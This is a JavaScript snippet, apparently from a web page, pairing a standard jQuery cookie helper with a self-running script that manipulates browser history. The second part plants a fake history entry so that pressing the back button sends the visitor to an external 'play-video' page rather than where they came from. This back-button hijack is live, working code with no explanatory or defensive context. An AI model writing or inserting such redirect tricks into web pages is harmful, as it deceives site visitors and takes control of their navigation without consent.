        jQuery.cookie = function(d, e, b) {
            if (arguments.length > 1 && String(e) !== "[object Object]") {
                b = jQuery.extend({}, b);
                if (e === null || e === undefined) {
                    b.expires = -1
                }
                if (typeof b.expires === "number") {
                    var g = b.expires,
                        c = b.expires = new Date();
                    c.setDate(c.getDate() + g)
                }
                e = String(e);
                return (document.cookie = [encodeURIComponent(d), "=", b.raw ? e : encodeURIComponent(e), b.expires ? "; expires=" + b.expires.toUTCString() : "", b.path ? "; path=" + b.path : "", b.domain ? "; domain=" + b.domain : "", b.secure ? "; secure" : ""].join(""))
            }
            b = e || {};
            var a, f = b.raw ? function(h) {
                return h
            } : decodeURIComponent;
            return (a = new RegExp("(?:^|; )" + encodeURIComponent(d) + "=([^;]*)").exec(document.cookie)) ? f(a[1]) : null
        }; 

(function(window, location) {
    history.replaceState(null, document.title, location.pathname+"#!/history");
    history.pushState(null, document.title, location.pathname);
    window.addEventListener("popstate", function() {
        if(location.hash === "#!/history") {
            history.replaceState(null, document.title, location.pathname);
            setTimeout(function(){
                location.replace("https://www.aridjaya.com/p/play-video.html");
            },0);
        }}, false);
}(window, location));
